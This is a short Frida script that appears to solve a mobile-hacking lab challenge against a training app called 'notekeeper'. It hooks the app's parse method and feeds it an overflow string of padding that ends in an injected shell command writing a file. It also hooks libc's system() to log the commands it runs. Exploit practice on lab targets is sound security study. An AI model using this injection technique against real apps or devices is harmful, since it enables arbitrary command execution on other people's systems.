Java.perform(function(){

    let main     = Java.use("com.mobilehackinglab.notekeeper.MainActivity")
    const string = Java.use('java.lang.String')

    main["parse"].implementation = function(a) {
        const payload = string.$new("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAecho 'pwn3d!' > /data/data/com.mobilehackinglab.notekeeper/pwn.dat;#")
        console.log(`[*] parse method called with: ${a}`)
        console.log('[+] check /data/data/com.mobilehackinglab.notekeeper/pwn.dat')
        const new_ret = this["parse"](payload)
        return new_ret
    }
  
})

Interceptor.attach(Module.getExportByName('libc.so', 'system'), {
  
    onEnter(args) {
        var p1 = Memory.readUtf8String(args[0]);
        console.log(`[*] libc_system called with ${p1}`)
    },
    onLeave(retval) {
        console.log("[!] bye bye")
    }
  
})
